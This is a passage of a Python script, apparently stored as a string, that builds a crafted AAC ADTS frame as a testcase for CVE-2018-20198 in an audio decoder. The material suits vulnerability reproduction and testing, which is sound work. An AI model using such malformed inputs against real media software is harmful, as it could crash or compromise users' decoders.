2:11]=00\n    byte3 = 0x80 | ((total_length >> 11) & 0x03)  # 0b10000000\n    \n    # Byte 4: frame_length[10:3]\n    byte4 = (total_length >> 3) & 0xFF\n    \n    # Byte 5: frame_length[2:0], buffer_fullness[10:6]\n    byte5 = ((total_length & 0x07) << 5) | 0x1F\n    \n    # Byte 6: buffer_fullness[5:0], number_of_blocks=0\n    byte6 = 0xFC  # 0b11111100\n    \n    return bytes([byte0, byte1, byte2, byte3, byte4, byte5, byte6])\n\n\ndef create_cpe_payload():\n    """\n    Create a Channel Pair Element (CPE) payload\n    \n    CPE structure:\n    - element_instance_tag: 4 bits\n    - common_window: 1 bit\n    - ics_info (if common_window=1)\n    - ms_mask_present: 2 bits (if common_window=1)\n    - individual_channel_stream for left channel\n    - individual_channel_stream for right channel\n    """\n    \n    bits = []\n    \n    # ID_CPE = 0x1 (3 bits)\n    bits.extend([0, 0, 1])\n    \n    # element_instance_tag = 0 (4 bits)\n    bits.extend([0, 0, 0, 0])\n    \n    # common_window = 1 (use common window for stereo)\n    bits.append(1)\n    \n    # ics_info when common_window=1\n    # ics_reserved_bit = 0 (1 bit)\n    bits.append(0)\n    \n    # window_sequence = LONG_START_SEQUENCE = 0x1 (2 bits)\n    bits.extend([0, 1])\n    \n    # window_shape = 0 (1 bit)\n    bits.append(0)\n    \n    # For LONG_START_SEQUENCE:\n    # max_sfb = 1 (6 bits) - minimal scale factor bands\n    bits.extend([0, 0, 0, 0, 0, 1])\n    \n    # predictor_data_present = 0 (1 bit)\n    bits.append(0)\n    \n    # ms_mask_present = 0 (2 bits) - no M/S stereo\n    bits.extend([0, 0])\n    \n    # Now individual_channel_stream for left channel\n    # global_gain = 0 (8 bits)\n    bits.extend([0] * 8)\n    \n    # pulse_data_present = 0 (1 bit)\n    bits.append(0)\n    \n    # tns_data_present = 0 (1 bit)\n    bits.append(0)\n    \n    # gain_control_data_present = 0 (1 bit)\n    bits.append(0)\n    \n    # spectral_data - minimal (section_data + scale_factor_data + spectral_data)\n    # sect_cb = 0 (ZERO_HCB), sect_len = 0\n    # For simplicity, add minimal section data\n    bits.extend([0] * 8)  # section escape value to end sections\n    \n    # scale_factor_data (minimal)\n    bits.extend([0] * 8)\n    \n    # spectral_data (minimal)\n    bits.extend([0] * 16)\n    \n    # Right channel (similar structure)\n    bits.extend([0] * 8)  # global_gain\n    bits.append(0)  # pulse_data_present\n    bits.append(0)  # tns_data_present\n    bits.append(0)  # gain_control_data_present\n    bits.extend([0] * 8)  # section data\n    bits.extend([0] * 8)  # scale factors\n    bits.extend([0] * 16)  # spectral data\n    \n    # ID_END = 0x7 (3 bits) to terminate raw_data_block\n    bits.extend([1, 1, 1])\n    \n    # Convert bits to bytes\n    byte_data = bytearray()\n    for i in range(0, len(bits), 8):\n        byte_val = 0\n        for j in range(8):\n            if i + j < len(bits):\n                byte_val |= (bits[i + j] << (7 - j))\n        byte_data.append(byte_val)\n    \n    return bytes(byte_data)\n\n\ndef main():\n    print(f"Generating AAC ADTS testcase for CVE-2018-20198...")\n    \n    # Create payload\n    payload = create_cpe_payload()\n    \n    # Create ADTS header\n    header = create_adts_header(len(payload))\n    \n    # Write complete frame\n    with open(output_path, "wb") as f:\n        f.write(header)\n        f.write(payload)\n    \n    print(f"Generated testcase at {output_path}")\n    print(f"  Header size: {len(header)} bytes")\n    print(f"  Payload size: {len(payload)} bytes")\n    print(f"  Total size: {len(header) + len(payload)} bytes")\n    \n    return 0\n\nif __name__ == "__main__":\n    sys.exit(main())\n'}
